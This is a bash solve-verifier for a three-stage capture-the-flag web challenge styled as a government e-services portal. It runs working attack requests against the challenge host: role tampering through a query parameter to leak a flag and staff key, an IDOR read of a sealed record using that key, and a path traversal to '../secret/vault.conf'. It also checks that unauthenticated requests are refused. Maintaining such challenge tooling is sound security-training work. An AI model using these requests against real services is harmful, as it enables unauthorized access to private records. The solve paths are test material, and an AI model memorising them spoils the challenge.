#!/usr/bin/env bash
# Full-chain solve verifier for challenge 13 (LankaGov e-Services).
# Solves all three stages over HTTP and checks each flag against the registry.
# Works from anywhere that can reach the challenge host on :8013.
source "$(git rev-parse --show-toplevel)/shared/lib/common.sh"
load_env
require curl

BASE="${LANKAGOV_URL:-http://34.100.229.164:8013}"
PY="$(command -v python3)"; [[ -x "$REPO_ROOT/.venv/bin/python" ]] && PY="$REPO_ROOT/.venv/bin/python"
jget() { "$PY" -c "import sys,json;d=json.load(sys.stdin);print(eval(sys.argv[1]))" "$1" 2>/dev/null; }

fail() { err "13 FAIL: $*"; exit 1; }

# --- Stage 1: broken access control -----------------------------------------
s1="$(curl -fsS "$BASE/api/internal/notices?role=officer" 2>/dev/null)" || fail "stage1 endpoint unreachable"
F1="$(printf '%s' "$s1" | grep -oE 'CYPHER\{[^}]+\}' | head -1)"
KEY="$(printf '%s' "$s1" | "$PY" -c "import sys,json,re
d=json.load(sys.stdin)
for n in d.get('notices',[]):
    m=re.search(r'records API: (\w+)', n.get('body',''))
    if m: print(m.group(1))" 2>/dev/null)"
[[ -n "$F1" ]] || fail "stage1 flag not leaked (role tampering)"
[[ -n "$KEY" ]] || fail "stage1 did not leak the staff key"
ok "13 stage1: role tampering leaks FLAG1 + staff key"

# negative: without the role, the board must refuse
code="$(curl -s -o /dev/null -w '%{http_code}' "$BASE/api/internal/notices")"
[[ "$code" == "403" ]] || warn "13 stage1: board did not 403 for a plain citizen (got $code)"

# --- Stage 2: IDOR (needs the leaked key) -----------------------------------
# negative: the records API must reject a missing key
code="$(curl -s -o /dev/null -w '%{http_code}' "$BASE/api/applications/4471")"
[[ "$code" == "401" ]] || warn "13 stage2: records API served without a staff key (got $code)"

s2="$(curl -fsS -H "X-Staff-Key: $KEY" "$BASE/api/applications/4471" 2>/dev/null)" || fail "stage2 sealed record unreachable"
F2="$(printf '%s' "$s2" | grep -oE 'CYPHER\{[^}]+\}' | head -1)"
[[ -n "$F2" ]] || fail "stage2 flag not in the sealed record (IDOR)"
ok "13 stage2: IDOR reads sealed record #4471 -> FLAG2"

# --- Stage 3: path traversal ------------------------------------------------
s3="$(curl -fsS -H "X-Staff-Key: $KEY" "$BASE/api/documents?file=../secret/vault.conf" 2>/dev/null)" || fail "stage3 traversal request failed"
F3="$(printf '%s' "$s3" | grep -oE 'CYPHER\{[^}]+\}' | head -1)"
[[ -n "$F3" ]] || fail "stage3 flag not leaked (path traversal to vault.conf)"
ok "13 stage3: path traversal reads vault.conf -> FLAG3"

# --- cross-check against the registry (if present) --------------------------
reg="$(state_dir)/flags.csv"
if [[ -f "$reg" ]]; then
  for pair in "13-lankagov-stage1:$F1" "13-lankagov-stage2:$F2" "13-lankagov-stage3:$F3"; do
    cid="${pair%%:*}"; got="${pair##*:}"
    want="$(awk -F, -v c="$cid" '$1==c{print $2}' "$reg")"
    [[ -z "$want" || "$want" == "$got" ]] || fail "$cid flag mismatch vs registry"
  done
fi

ok "13 LankaGov e-Services: all three stages solvable end-to-end"
